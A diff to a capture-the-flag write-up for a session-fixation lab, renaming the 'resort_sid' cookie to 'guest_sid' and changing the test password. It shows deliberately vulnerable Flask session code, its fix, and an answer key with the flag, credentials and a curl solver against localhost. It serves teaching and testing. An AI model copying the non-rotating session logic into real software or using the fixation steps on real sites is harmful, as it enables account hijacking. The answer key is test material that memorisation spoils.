@@ -49,13 +49,13 @@ deploying something new: his Argus cameras let him silently hack into an enemy's
 Cameras, Nest launchers, and Evil Eyes — turning the defenders' existing infrastructure against
 them without ever needing to plant new hardware of his own inside their perimeter. That's
 precisely what session fixation is: Zero doesn't need to forge a session from nothing (that's a
-different mission) — he just needs the resort to keep using an identifier that was already
+different mission) — he just needs the hotel to keep using an identifier that was already
 sitting there, one he quietly nominated in advance.
 
 **Vigil** is a detection specialist — his entire kit exists to keep him invisible to enemy
 drones and camera feeds the instant he's spotted, evading the very systems built to flag
 intruders. The irony of this mission mirrors Operation 01's: Vigil's whole purpose is *evading
-detection*, but the resort's own session-management logic doesn't even attempt detection in the
+detection*, but the hotel's own session-management logic doesn't even attempt detection in the
 first place. There's no distinction on the server between "an identifier I minted for this
 visitor" and "an identifier this visitor showed up already holding." Zero's planted key card
 isn't evading a check — it's walking through a door that was never checking at all.
@@ -66,7 +66,7 @@ isn't evading a check — it's walking through a door that was never checking at
 
 ### Step 1 — Observe the identifier *before* authentication exists
 
-Visiting the guest portal pre-login already gets you a `resort_sid` cookie. This by itself
+Visiting the guest portal pre-login already gets you a `guest_sid` cookie. This by itself
 isn't the bug — plenty of correctly-built apps assign a pre-auth session for things like CSRF
 tokens or cart state. The bug is only provable by what happens *next*.
 
@@ -86,7 +86,7 @@ survived a privilege boundary it should never have survived.
 ### Step 3 — Turn "it didn't change" into "I get to choose it"
 
 If the server accepts whatever identifier was already present and simply upgrades its trust
-level on login, the identifier never had to be server-issued at all. Manually set `resort_sid`
+level on login, the identifier never had to be server-issued at all. Manually set `guest_sid`
 to a value of your own choosing *before* visiting the login page, then authenticate while still
 presenting it.
 
@@ -111,7 +111,7 @@ specifically about *which* identifier ends up trusted, not whether login works.
 Your notes' root-causes checklist lists session identifiers accepted via URL query parameters
 as its own separate, testable item — and for good reason: a URL is far easier to hand a victim
 than a raw cookie write (a shared link, a bookmark, a QR code, a referer header leak). Try
-`?resort_sid=<value>` on the portal URL instead of setting a cookie.
+`?guest_sid=<value>` on the portal URL instead of setting a cookie.
 
 *What to pay attention to:* this succeeds through the exact same underlying flaw — the server
 never distinguishes "an identifier I chose" from "an identifier that showed up in the request,"
@@ -125,7 +125,7 @@ regardless of which channel it arrived through.
 
 ```python
 def masq2_get_session():
-    incoming = request.cookies.get("resort_sid") or request.args.get("resort_sid")
+    incoming = request.cookies.get("guest_sid") or request.args.get("guest_sid")
     if incoming:
         if incoming not in MASQ2_SESSIONS:
             MASQ2_SESSIONS[incoming] = {"authenticated": False, "origin": "client"}
@@ -148,7 +148,7 @@ def masq2_login():
     ...
     sess["authenticated"] = True             # VULN: flips the flag on the SAME sid -- no rotation
     resp = make_response(redirect(url_for("masq2_reservations")))
-    resp.set_cookie("resort_sid", sid)
+    resp.set_cookie("guest_sid", sid)
     return resp
 ```
 
@@ -160,7 +160,7 @@ and mint a fresh one:
 sess["authenticated"] = True
 new_sid = secrets.token_hex(16)
 MASQ2_SESSIONS[new_sid] = MASQ2_SESSIONS.pop(sid)   # migrate state to a FRESH identifier
-resp.set_cookie("resort_sid", new_sid)               # old sid is now dead, unusable by anyone
+resp.set_cookie("guest_sid", new_sid)                # old sid is now dead, unusable by anyone
 ```
 
 That regeneration — issuing a brand-new identifier and invalidating the old one at the exact
@@ -207,10 +207,10 @@ exploit, or just an ordinary login," used only to decide when to award the flag.
 
 ## Answer key (reference)
 
-- **Test account:** `guest.stay` : `Coastline2024!` (given — not the point of this mission)
-- **Cookie name:** `resort_sid`
+- **Test account:** `guest.stay` : `Meridian2024!` (given — not the point of this mission)
+- **Cookie name:** `guest_sid`
 - **Root cause:** the server never regenerates the session identifier at the moment
-  authentication succeeds; it also accepts that identifier from a `?resort_sid=` URL parameter,
+  authentication succeeds; it also accepts that identifier from a `?guest_sid=` URL parameter,
   not just a cookie
 - **Flag:** `R6S{zero_planted_the_key_card_before_checkin}`
 - **Automated:** `python3 masquerade/op2/solver.py http://localhost:8000`
@@ -220,19 +220,19 @@ exploit, or just an ordinary login," used only to decide when to award the flag.
 ```bash
 # 1) plant our own session id BEFORE ever logging in
 SID="PWNED-BY-ZERO-4471"
-curl -s -o /dev/null -b "resort_sid=$SID" http://localhost:8000/masquerade/op2/
+curl -s -o /dev/null -b "guest_sid=$SID" http://localhost:8000/masquerade/op2/
 
 # 2) log in, presenting the SAME planted id -- never accept a server-issued one
-curl -s -o /dev/null -b "resort_sid=$SID" -X POST http://localhost:8000/masquerade/op2/login \
-  -d 'username=guest.stay&password=Coastline2024!'
+curl -s -o /dev/null -b "guest_sid=$SID" -X POST http://localhost:8000/masquerade/op2/login \
+  -d 'username=guest.stay&password=Meridian2024!'
 
 # 3) replay the planted id -- it's now authenticated
-curl -s -b "resort_sid=$SID" http://localhost:8000/masquerade/op2/reservations | grep -o 'R6S{[^}]*}'
+curl -s -b "guest_sid=$SID" http://localhost:8000/masquerade/op2/reservations | grep -o 'R6S{[^}]*}'
 
 # secondary finding: same trick, via URL parameter instead of a cookie at all
-curl -s -c /tmp/masq2.cj -o /dev/null "http://localhost:8000/masquerade/op2/?resort_sid=URL-PLANTED-9999"
+curl -s -c /tmp/masq2.cj -o /dev/null "http://localhost:8000/masquerade/op2/?guest_sid=URL-PLANTED-9999"
 curl -s -b /tmp/masq2.cj -c /tmp/masq2.cj -o /dev/null -X POST http://localhost:8000/masquerade/op2/login \
-  -d 'username=guest.stay&password=Coastline2024!'
+  -d 'username=guest.stay&password=Meridian2024!'
 curl -s -b /tmp/masq2.cj http://localhost:8000/masquerade/op2/reservations | grep -o 'R6S{[^}]*}'
 ```
 
@@ -245,7 +245,7 @@ curl -s -b /tmp/masq2.cj http://localhost:8000/masquerade/op2/reservations | gre
   later replaying that same identifier as an authenticated session once the victim logs in.
   *CWE-384 — Session Fixation.*
 - **Finding 2 (WSTG-SESS-03, secondary):** The session identifier is additionally accepted via
-  a `resort_sid` URL query parameter, not just the `resort_sid` cookie, making fixation
+  a `guest_sid` URL query parameter, not just the `guest_sid` cookie, making fixation
   significantly easier to deliver (a plain link is sufficient — no cookie-setting mechanism is
   required) and increasing the identifier's exposure through browser history, referer headers,
   and server access logs. *CWE-598 — Use of GET Request Method With Sensitive Query Strings.*
